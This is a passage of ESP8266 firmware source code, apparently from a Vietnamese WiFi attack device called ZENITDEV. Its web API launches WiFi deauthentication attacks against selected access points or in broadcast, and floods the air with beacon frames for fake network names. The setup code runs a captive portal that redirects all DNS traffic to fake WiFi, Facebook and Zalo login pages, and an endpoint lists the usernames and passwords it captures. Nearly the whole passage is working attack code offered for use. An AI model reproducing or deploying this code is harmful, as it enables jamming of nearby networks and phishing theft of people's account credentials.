void handle_api_select()     { int id=server.arg("id").toInt(); bool on=server.arg("val")=="1"; if(id>=0&&id<ap_count)ap_list[id].selected=on; server.send(200,"application/json","{\"ok\":true}"); }
void handle_api_select_all() { bool v=server.arg("val")=="1"; for(int i=0;i<ap_count;i++)ap_list[i].selected=v; server.send(200,"application/json","{\"ok\":true}"); }

void handle_api_attack() {
    String mode=server.arg("mode"), resp="";
    if (mode=="cont_on") {
        G.atk_continuous=true; atk_ticker.attach_ms(200,atk_tick);
        strncpy(G.status,"Continuous attack: ON",80);
        resp="{\"status\":\"Continuous ON\"}";
    } else if (mode=="cont_off") {
        G.atk_continuous=false; atk_ticker.detach();
        strncpy(G.status,"Continuous attack: OFF",80);
        resp="{\"status\":\"Continuous OFF\"}";
    } else if (mode=="selected") {
        int burst=server.hasArg("burst")?server.arg("burst").toInt():80;
        int loops=server.hasArg("loops")?server.arg("loops").toInt():5;
        for (int l=0;l<loops;l++){atk_selected(burst);yield();}
        char buf[80]; snprintf(buf,80,"Xong - %u frames",G.deauth_count);
        strncpy(G.status,buf,80);
        resp="{\"status\":\""+String(G.status)+"\",\"deauth_count\":"+String(G.deauth_count)+"}";
    } else if (mode=="single") {
        int id=server.arg("id").toInt();
        int burst=server.hasArg("burst")?server.arg("burst").toInt():300;
        if (id>=0&&id<ap_count) {
            uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
            send_deauth(ap_list[id].channel,ap_list[id].bssid,bc,burst);
            char buf[80]; snprintf(buf,80,"JAM %s - %u frames",ap_list[id].ssid,G.deauth_count);
            strncpy(G.status,buf,80);
        }
        resp="{\"status\":\""+String(G.status)+"\",\"deauth_count\":"+String(G.deauth_count)+"}";
    } else if (mode=="broadcast") {
        int burst=server.hasArg("burst")?server.arg("burst").toInt():100;
        atk_broadcast(burst);
        char buf[80]; snprintf(buf,80,"Broadcast xong - %u frames",G.deauth_count);
        strncpy(G.status,buf,80);
        resp="{\"status\":\""+String(G.status)+"\",\"deauth_count\":"+String(G.deauth_count)+"}";
    } else { resp="{\"err\":\"unknown mode\"}"; }
    server.send(200,"application/json",resp);
}

void handle_api_beacon_def() {
    const char *def[]={"FPT_WiFi_2.4G","Viettel_Home","VNPT_Fiber","TP-Link_2345","VNPT_GAN_01",
        "FPT_Gpon_01","Tenda_Home","D-Link_Router","ASUS_RT-AX86U","Xiaomi_Router",
        "HUAWEI_B315","ZTE_MF28D","AndroidHotspot_01","iPhone_NVH","Samsung_Galaxy",
        "OPPO_Reno","SinhVienKTX","WiFi_Tang_5","TroGiang_305","NhaTroNam_2G",
        "CafeWiFi_Free","QuanNet_01","TiemGiay_WiFi","SieuThi_Free","Airport_Free",
        "VincomCenter","BigC_Guest","LotteMart_WiFi","FREE_WIFI_HERE","DoNotConnect",
        "Hidden_Network","FBI_Surveillance","NSA_Van_01","CIA_Station","Secret_5G",
        "NETGEAR_HIDDEN","xfinitywifi","ATT_WiFiGateway","Spectrum_Mobile","MobileHotspot_LTE",
        "AndroidAP_9876","HotspotSE_01","Pocket_WiFi_LTE","BackOffice_AP","GuestNet_Secure",
        "NVH_Private","ZenitNet_001","Admin_Network","Corp_WiFi_2G","Internal_Only"};
    String j="{\"ssids\":[";
    for (int i=0;i<50;i++) { j+="\""+String(def[i])+"\""; if(i<49)j+=","; }
    j+="]}";
    server.send(200,"application/json",j);
}

void handle_api_beacon_start() {
    if (!server.hasArg("plain")) { server.send(400,"application/json","{\"err\":\"no body\"}"); return; }
    String body=server.arg("plain");
    beacon_ssid_count=0;
    int arr=body.indexOf('[');
    if (arr==-1) { server.send(400,"application/json","{\"err\":\"bad json\"}"); return; }
    int pos=body.indexOf('"',arr);
    while (pos!=-1&&beacon_ssid_count<MAX_SSIDS) {
        int end=body.indexOf('"',pos+1); if(end==-1) break;
        String s=body.substring(pos+1,end);
        if (s.length()>0&&s.length()<=32) {
            strncpy(beacon_ssids[beacon_ssid_count],s.c_str(),32);
            beacon_ssids[beacon_ssid_count][32]='\0';
            beacon_ssid_count++;
        }
        pos=body.indexOf('"',end+1);
    }
    if (beacon_ssid_count>0) {
        G.beacon_spam=true; beacon_ticker.attach_ms(60,beacon_tick);
        char buf[80]; snprintf(buf,80,"Beacon spam ON - %d SSID",beacon_ssid_count);
        strncpy(G.status,buf,80);
        server.send(200,"application/json","{\"status\":\"Beacon spam ON\",\"count\":"+String(beacon_ssid_count)+"}");
    } else { server.send(400,"application/json","{\"err\":\"no ssids parsed\"}"); }
}

void handle_api_beacon_stop() {
    G.beacon_spam=false; beacon_ticker.detach();
    strncpy(G.status,"Beacon spam OFF",80);
    server.send(200,"application/json","{\"status\":\"Beacon spam OFF\"}");
}

void handle_api_creds() {
    String j="{\"count\":"+String(cred_count)+",\"creds\":[";
    for (int i=0;i<cred_count;i++) {
        j+="{\"type\":\""+String(creds[i].type)+"\",\"user\":\""+String(creds[i].user)+"\",\"pass\":\""+String(creds[i].pass)+"\",\"ts\":\""+String(creds[i].ts)+"\"}";
        if (i<cred_count-1) j+=",";
    }
    j+="]}";
    server.send(200,"application/json",j);
}

void handle_api_creds_clear() { cred_count=0; server.send(200,"application/json","{\"ok\":true}"); }

void handle_api_status() {
    G.uptime=millis()/1000;
    String j="{\"atk_continuous\":"; j+=(G.atk_continuous?"true":"false");
    j+=",\"beacon_spam\":"; j+=(G.beacon_spam?"true":"false");
    j+=",\"deauth_count\":"+String(G.deauth_count);
    j+=",\"beacon_count\":"+String(G.beacon_count);
    j+=",\"ap_count\":"+String(ap_count);
    j+=",\"cred_count\":"+String(cred_count);
    j+=",\"uptime\":"+String(G.uptime);
    j+=",\"status\":\""+String(G.status)+"\"}";
    server.send(200,"application/json",j);
}

// ========== SETUP ==========
void setup() {
    Serial.begin(115200); delay(500);
    Serial.println(F("\n[ZENITDEV] v2.0 FULL BOOT"));

    WiFi.setOutputPower(20.5);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(AP_IP,AP_IP,SUBNET);
    WiFi.softAP(AP_SSID,AP_PASS);

    // DNS: moi request -> captive portal
    dns.setErrorReplyCode(DNSReplyCode::NoError);
    dns.start(53,"*",AP_IP);

    // Routes
    server.on("/",                HTTP_GET,  handle_root);
    server.on("/wifi",            HTTP_GET,  handle_wifi_page);
    server.on("/facebook",        HTTP_GET,  handle_fb_page);
    server.on("/zalo",            HTTP_GET,  handle_zalo_page);
    server.on("/wifi_submit",     HTTP_POST, handle_wifi_submit);
    server.on("/facebook_submit", HTTP_POST, handle_fb_submit);
    server.on("/zalo_submit",     HTTP_POST, handle_zalo_submit);

    // API
    server.on("/api/aps",          HTTP_GET,  handle_api_aps);
    server.on("/api/scan",         HTTP_GET,  handle_api_scan);
    server.on("/api/select",       HTTP_GET,  handle_api_select);
    server.on("/api/select_all",   HTTP_GET,  handle_api_select_all);
    server.on("/api/attack",       HTTP_GET,  handle_api_attack);
    server.on("/api/beacon_def",   HTTP_GET,  handle_api_beacon_def);
    server.on("/api/beacon_start", HTTP_POST, handle_api_beacon_start);
    server.on("/api/beacon_stop",  HTTP_GET,  handle_api_beacon_stop);
    server.on("/api/creds",        HTTP_GET,  handle_api_creds);
    server.on("/api/creds_clear",  HTTP_GET,  handle_api_creds_clear);
    server.on("/api/status",       HTTP_GET,  handle_api_status);

    // Captive portal catch-all
    server.onNotFound(handle_captive);

    server.begin();
    Serial.println(F("[ZENITDEV] Live: http://192.168.4.1"));
    strncpy(G.status,"San sang. Quet mang de bat dau.",80);
}

// ========== LOOP ==========
void loop() {
    dns.processNextRequest();
    server.handleClient();
    yield();
}
